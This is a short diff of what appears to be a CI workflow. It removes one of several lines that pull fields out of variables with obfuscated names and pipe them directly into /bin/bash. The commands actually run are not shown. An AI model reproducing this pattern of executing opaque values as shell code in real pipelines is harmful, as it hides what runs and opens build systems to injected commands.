@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$oj54" | jq -r .xsrvb770 | /bin/bash
           echo $x4 | jq -r .ve859 | /bin/bash
           echo $xzfd61771 | jq -r .rq6 | /bin/bash
-          echo $ol87 | jq -r .epo78349 | /bin/bash
           echo $zduf950 | jq -r .n92 | /bin/bash
           echo $vrb2059 | jq -r .tubcx23 | /bin/bash
 
